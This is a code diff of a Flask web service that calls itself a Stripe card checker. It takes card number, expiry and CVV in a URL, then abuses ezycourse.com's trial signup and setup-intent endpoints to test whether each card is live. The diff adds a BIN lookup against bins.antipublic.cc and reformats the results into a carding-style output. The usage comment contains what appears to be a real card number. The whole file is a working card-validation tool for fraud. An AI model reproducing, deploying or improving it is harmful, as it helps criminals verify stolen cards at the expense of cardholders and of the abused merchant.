@@ -1,21 +1,21 @@
 # app.py
 # Stripe card checker — URL-based API
-# Usage: GET /check?cc=4111111111111111|12|25|123
-# code by diwazz (modified for web)
+# Usage: GET /check?cc=4833130058487877|08|2027|442
 
 import os
 import re
+import time
 import json
 import random
-import string
-from flask import Flask, request, jsonify
+import asyncio
 import requests
-from bs4 import BeautifulSoup
+import aiohttp
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
 # ─────────────────────────────────────────────
-# CONFIG — set these as Render env vars
+# CONFIG
 # ─────────────────────────────────────────────
 STRIPE_PK = os.environ.get(
     "STRIPE_PK",
@@ -24,7 +24,7 @@ STRIPE_PK = os.environ.get(
 STRIPE_VERSION = os.environ.get("STRIPE_VERSION", "2025-03-31.basil")
 SIGNUP_URL = "https://ezycourse.com/signup"
 SETUP_INTENT_URL = "https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent"
-HCAPTCHA_TOKEN = os.environ.get("HCAPTCHA_TOKEN", "")  # optional, may be required
+HCAPTCHA_TOKEN = os.environ.get("HCAPTCHA_TOKEN", "")
 
 UA = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -41,16 +41,10 @@ def rand_hex(n: int) -> str:
 
 
 def rand_uuid_like() -> str:
-    return "".join(
-        random.choices("0123456789abcdef-", k=36)
-    )
+    return "".join(random.choices("0123456789abcdef-", k=36))
 
 
 def parse_cc(raw: str):
-    """
-    Accepts: cc|mm|yy|cvv
-    Returns (number, mm, yy, cvc) or None on bad input.
-    """
     if not raw:
         return None
     parts = [p.strip() for p in raw.split("|")]
@@ -82,33 +76,56 @@ def luhn_ok(number: str) -> bool:
     return total % 10 == 0
 
 
-def brand_from_bin(number: str) -> str:
-    b = number[:1]
-    b2 = number[:2]
-    if b == "4":
-        return "Visa"
-    if b2 in ("51", "52", "53", "54", "55") or number[:4] in (
-        "2221", "2222", "2223", "2224", "2225", "2226", "2227", "2228", "2229",
-        "223", "224", "225", "226", "227", "228", "229", "23", "24", "25", "26",
-        "270", "271", "2720",
-    ):
-        return "Mastercard"
-    if b2 in ("34", "37"):
-        return "Amex"
-    if b2 in ("60", "65") or number[:3] == "601":
-        return "Discover"
-    if b2 == "35":
-        return "JCB"
-    if number[:2] == "62":
-        return "UnionPay"
-    return "Unknown"
+# ─────────────────────────────────────────────
+# ASYNC BIN LOOKUP — antipublic
+# ─────────────────────────────────────────────
+async def get_bin_info(card_number: str):
+    """
+    Returns (brand, bin_type, level, bank, country, flag).
+    All '-' on failure.
+    """
+    try:
+        bin_number = card_number[:6]
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(
+                f"https://bins.antipublic.cc/bins/{bin_number}"
+            ) as res:
+                if res.status != 200:
+                    return "BIN Info Not Found", "-", "-", "-", "-", ""
+                response_text = await res.text()
+                try:
+                    data = json.loads(response_text)
+                    brand = data.get("brand", "-")
+                    bin_type = data.get("type", "-")
+                    level = data.get("level", "-")
+                    bank = data.get("bank", "-")
+                    country = data.get("country_name", "-")
+                    flag = data.get("country_flag", "")
+                    return brand, bin_type, level, bank, country, flag
+                except json.JSONDecodeError:
+                    return "-", "-", "-", "-", "-", ""
+    except Exception:
+        return "-", "-", "-", "-", "-", ""
 
 
+def run_bin_lookup(card_number: str):
+    """Sync bridge for Flask route."""
+    try:
+        return asyncio.run(get_bin_info(card_number))
+    except RuntimeError:
+        # If already inside an event loop (rare with Flask sync route)
+        loop = asyncio.new_event_loop()
+        try:
+            return loop.run_until_complete(get_bin_info(card_number))
+        finally:
+            loop.close()
+
+
+# ─────────────────────────────────────────────
+# STRIPE FLOW
+# ─────────────────────────────────────────────
 def fresh_session() -> requests.Session:
-    """
-    Create a requests session and hit the signup page
-    so we get fresh XSRF-TOKEN + cookies (they rotate).
-    """
     s = requests.Session()
     s.headers.update({
         "user-agent": UA,
@@ -122,48 +139,12 @@ def fresh_session() -> requests.Session:
 
 
 def get_xsrf(session: requests.Session) -> str:
-    """
-    Pull XSRF-TOKEN from the session cookies, url-decoded.
-    Laravel stores it as e:<base64>.<sig> — pass it raw in header.
-    """
     from urllib.parse import unquote
     tok = session.cookies.get("XSRF-TOKEN")
-    if not tok:
-        return ""
-    return unquote(tok)
+    return unquote(tok) if tok else ""
 
 
-# ─────────────────────────────────────────────
-# STRIPE FLOW
-# ─────────────────────────────────────────────
-def bin_metadata(session, number):
-    """Optional BIN metadata lookup from Stripe."""
-    headers = {
-        "accept": "application/json",
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": "https://js.stripe.com",
-        "referer": "https://js.stripe.com/",
-        "user-agent": UA,
-    }
-    params = {
-        "bin_prefix": number[:6],
-        "key": STRIPE_PK,
-        "_stripe_version": STRIPE_VERSION,
-    }
-    try:
-        r = session.get(
-            "https://api.stripe.com/edge-internal/card-metadata",
-            params=params, headers=headers, timeout=20,
-        )
-        if r.status_code == 200:
-            return r.json()
-    except Exception:
-        pass
-    return {}
-
-
-def create_payment_method(session, number, mm, yy, cvc):
-    """POST /v1/payment_methods on Stripe. Returns (ok, data)."""
+def create_payment_method(number, mm, yy, cvc):
     headers = {
         "accept": "application/json",
         "content-type": "application/x-www-form-urlencoded",
@@ -205,7 +186,6 @@ def create_payment_method(session, number, mm, yy, cvc):
 
 
 def create_setup_intent(session, pm_id):
-    """POST setup intent on ezycourse. Returns (status_code, json)."""
     headers = {
         "accept": "application/json, text/plain, */*",
         "content-type": "application/json",
@@ -214,14 +194,10 @@ def create_setup_intent(session, pm_id):
         "user-agent": UA,
         "x-xsrf-token": get_xsrf(session),
     }
-    payload = {
-        "stripe_payment_method_uuid": pm_id,
-        "is_trial": True,
-    }
+    payload = {"stripe_payment_method_uuid": pm_id, "is_trial": True}
     try:
         r = session.post(
-            SETUP_INTENT_URL,
-            headers=headers, json=payload, timeout=60,
+            SETUP_INTENT_URL, headers=headers, json=payload, timeout=60,
         )
         try:
             return r.status_code, r.json()
@@ -231,32 +207,14 @@ def create_setup_intent(session, pm_id):
         return 0, {"error": {"message": f"network: {e}"}}
 
 
-# ─────────────────────────────────────────────
-# CLASSIFY RESULT
-# ─────────────────────────────────────────────
 def classify(pm_status, pm_data, si_status, si_data):
-    """
-    Turn raw Stripe/ezy responses into a clean verdict.
-    Returns (status, response_text, code).
-    """
-    # Stripe payment_methods rejected the card outright
     if pm_status != 200:
         err = (pm_data or {}).get("error", {}) or {}
         msg = err.get("message", "Unknown error")
         code = err.get("code", "error")
-        declined_codes = {
-            "card_declined", "expired_card", "incorrect_cvc",
-            "incorrect_number", "invalid_expiry_month",
-            "invalid_expiry_year", "invalid_cvc", "invalid_number",
-            "processing_error", "card_not_supported",
-        }
-        if code in declined_codes:
-            return "DECLINED", msg, code
-        return "ERROR", msg, code
+        return False, msg, code
 
-    # Payment method created — now check setup intent
     if si_status == 200:
-        # ezycourse often returns a message field; try a few shapes
         msg = (
             si_data.get("message")
             or si_data.get("status")
@@ -266,17 +224,43 @@ def classify(pm_status, pm_data, si_status, si_data):
         if isinstance(msg, str):
             ml = msg.lower()
             if "declin" in ml or "fail" in ml or "error" in ml:
-                return "DECLINED", msg, si_data.get("code", "si_declined")
-            return "APPROVED", msg, si_data.get("code", "si_approved")
-        return "APPROVED", str(msg), "si_ok"
+                return False, msg, si_data.get("code", "si_declined")
+            return True, msg, si_data.get("code", "si_approved")
+        return True, str(msg), "si_ok"
 
-    # Setup intent failed
     err = (si_data or {}).get("error", {}) or {}
     msg = err.get("message") or si_data.get("message") or "Setup intent failed"
     code = err.get("code") or si_data.get("code") or "si_error"
-    if "declin" in str(msg).lower():
-        return "DECLINED", msg, code
-    return "ERROR", msg, code
+    return False, msg, code
+
+
+# ─────────────────────────────────────────────
+# BIN → display fields (antipublic shape)
+# ─────────────────────────────────────────────
+def build_bin_fields(brand, bin_type, level, bank, country, flag):
+    """
+    Mirror your example schema:
+      Brand:   VISA
+      Issuer:  JPMORGAN CHASE BANK N.A. - DEBIT
+      Country: 🇺🇸 UNITED STATES
+    """
+    brand_out = (brand or "UNKNOWN").upper()
+    bank_out = (bank or "UNKNOWN").upper()
+    type_out = (bin_type or "").upper()
+
+    issuer = bank_out
+    if type_out and type_out not in ("-", ""):
+        issuer = f"{bank_out} - {type_out}"
+
+    country_out = f"{flag} {country.upper()}".strip() if country and country != "-" else "UNKNOWN"
+
+    return {
+        "Brand": brand_out,
+        "Issuer": issuer,
+        "Country": country_out,
+        # extras — drop these if you want the response tighter
+        "Level": level if level and level != "-" else None,
+    }
 
 
 # ─────────────────────────────────────────────
@@ -285,8 +269,7 @@ def classify(pm_status, pm_data, si_status, si_data):
 @app.route("/", methods=["GET"])
 def index():
     return jsonify({
-        "name": "stripe-checker",
-        "author": "diwazz",
+        "name": "checker",
         "usage": "/check?cc=number|mm|yy|cvv",
         "gateway": "Stripe",
     })
@@ -294,62 +277,57 @@ def index():
 
 @app.route("/check", methods=["GET"])
 def check():
+    start = time.time()
     raw = request.args.get("cc", "")
     parsed = parse_cc(raw)
+
     if not parsed:
         return jsonify({
-            "status": "ERROR",
-            "gateway": "Stripe",
-            "response": "Invalid input. Format: cc|mm|yy|cvv",
-            "card": raw,
+            "cc": raw,
+            "Gateway": "UNKNOWN",
+            "Response": "Invalid input format",
+            "Price": 0.0,
+            "Currency": "USD",
+            "Brand": "UNKNOWN",
+            "Issuer": "UNKNOWN",
+            "Country": "UNKNOWN",
+            "Status": False,
+            "Proxy": "Not Used",
+            "Time": f"{time.time() - start:.2f}s",
         }), 400
 
     number, mm, yy, cvc = parsed
+    cc_display = f"{number}|{mm}|{yy}|{cvc}"
 
-    # Luhn sanity (Stripe will still be the real check)
-    luhn = luhn_ok(number)
-    brand = brand_from_bin(number)
+    # ── BIN lookup (async) ─────────────────
+    brand, bin_type, level, bank, country, flag = run_bin_lookup(number)
+    bin_fields = build_bin_fields(brand, bin_type, level, bank, country, flag)
 
+    # ── Stripe flow ────────────────────────
     session = fresh_session()
+    pm_status, pm_data = create_payment_method(number, mm, yy, cvc)
+    pm_id = pm_data.get("id") if isinstance(pm_data, dict) else None
 
-    # Optional BIN info (doesn't gate the flow)
-    bin_info = bin_metadata(session, number)
-
-    # 1) Create Stripe payment method
-    pm_status, pm_data = create_payment_method(session, number, mm, yy, cvc)
-    pm_id = None
-    if isinstance(pm_data, dict):
-        pm_id = pm_data.get("id")
-
-    # 2) If PM ok, create setup intent
     si_status, si_data = (0, {})
     if pm_status == 200 and pm_id:
         si_status, si_data = create_setup_intent(session, pm_id)
 
-    status, response_text, code = classify(
-        pm_status, pm_data, si_status, si_data
-    )
+    ok, msg, code = classify(pm_status, pm_data, si_status, si_data)
+
+    elapsed = f"{time.time() - start:.2f}s"
 
     return jsonify({
-        "status": status,
-        "gateway": "Stripe",
-        "response": response_text,
-        "response_code": code,
-        "card": f"{number}|{mm}|{yy}|{cvc}",
-        "brand": brand,
-        "luhn": luhn,
-        "bin": {
-            "prefix": number[:6],
-            "country": (bin_info or {}).get("country"),
-            "brand": (bin_info or {}).get("brand") or brand,
-            "type": (bin_info or {}).get("funding"),
-            "bank": (bin_info or {}).get("bank_name"),
-        },
-        "stripe_payment_method": pm_id,
-        "raw": {
-            "payment_methods": pm_data,
-            "setup_intent": si_data,
-        },
+        "cc": cc_display,
+        "Gateway": "Stripe",
+        "Response": msg,
+        "Price": 0.0,
+        "Currency": "USD",
+        "Brand": bin_fields["Brand"],
+        "Issuer": bin_fields["Issuer"],
+        "Country": bin_fields["Country"],
+        "Status": ok,
+        "Proxy": "Not Used",
+        "Time": elapsed,
     })
 
 
